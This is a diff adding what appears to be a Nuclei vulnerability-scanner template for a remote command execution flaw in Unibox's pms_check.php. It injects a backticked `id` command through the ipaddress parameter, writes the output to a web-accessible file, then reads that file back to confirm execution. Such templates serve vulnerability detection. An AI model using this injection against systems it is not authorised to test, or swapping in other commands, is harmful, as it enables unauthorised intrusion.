@@ -1,0 +1,35 @@
+id: unibox-pms_check-RCE
+
+info:
+  name: unibox-pms_check-RCE
+  author: iSee857
+  severity: critical
+  description: unibox-pms_check-RCE
+  reference:
+    - https://github.com/iSee857
+
+http:
+  - raw:
+      - |
+        GET /billing/pms_check.php?ipaddress=`id>/usr/local/unibox-0.9/network/upload.txt` HTTP/1.1
+        Host: {{Host}}
+        User-Agent: Mozilla/5.0
+        Content-Length: 30
+
+      - |
+        GET /network/upload.txt HTTP/1.1
+        Host: {{Host}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Cookie: RUIJIEID={{ruijie_cookie}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        part: body
+
+      - type: status
+        status:
+          - 200
